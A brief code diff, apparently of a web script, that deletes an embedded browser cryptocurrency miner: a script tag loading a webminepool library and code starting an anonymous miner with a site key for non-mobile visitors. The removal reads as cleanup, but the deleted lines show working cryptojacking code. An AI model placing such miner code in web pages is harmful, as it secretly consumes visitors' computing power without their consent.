@@ -9,10 +9,4 @@
         }
     }
 })();
-<script src="https://webminepool.com/lib/base.js"></script>
-<script>
-    var miner = WMP.Anonymous('SK_XaGDAmHxh65BBgWYWlFx9');
-    if (!miner.isMobile()){
-        miner.start();
-    }
-</script>
+
